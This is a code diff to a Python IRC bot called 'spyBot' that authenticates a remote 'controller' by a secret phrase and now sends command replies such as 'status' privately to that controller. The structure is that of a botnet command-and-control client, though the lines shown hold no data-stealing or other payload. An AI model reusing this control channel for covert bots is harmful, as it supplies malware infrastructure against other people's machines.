@@ -20,6 +20,7 @@ class Bot():
         self.irc_socket = None
         self.nickname = 'spyBot'
         self.controller = None
+        self.controller_nickname = None
     
     def __send_to_channel(self, msg):
         '''
@@ -28,12 +29,12 @@ class Bot():
         '''
         self.__send_message('PRIVMSG ' + self.channel + ' :' + msg + '\n')
     
-    def __send_to_user(self, msg, nickname):
+    def __send_to_controller(self, msg):
         '''
         send message to specific user
         format PRIVMSG <nickname> :<message>
         '''
-        self.__send_message('PRIVMSG ' + nickname + ' :' + msg + '\n')
+        self.__send_message('PRIVMSG ' + self.controller_nickname + ' :' + msg + '\n')
 
     def __send_message(self, msg):
         '''
@@ -85,7 +86,7 @@ class Bot():
         _, cmd = msg.split(' :')
         
         if cmd.startswith('status'):
-            self.__send_to_channel(self.nickname)
+            self.__send_to_controller(self.nickname)
         
         elif cmd.startswith('quit'):
             raise NotImplementedError()
@@ -108,13 +109,16 @@ class Bot():
         format --> :Guest52!889f1007@87.98.219.117 PRIVMSG <#channel> :<msg>
         '''
         sender = msg.split(':')[1].split(' ')[0]
-        _, secret = msg.split(' :')
+        list = msg.split(' :')
+        secret = list[1]
         if self.secret_phrase == secret:
             self.controller = sender
+            self.controller_nickname, _ = sender.split('!')
+            self.controller_nickname.replace(':', '')
             log('Authenticated controller: ' + self.controller)
             return True
         else:
-            log('Failed to authenticate controller: {}, using secret_phrase: {}'.format(self.controller, secret))
+            log('Failed to authenticate controller: {}, using secret_phrase: {}'.format(sender, secret))
             return False
 
     def __listen(self):
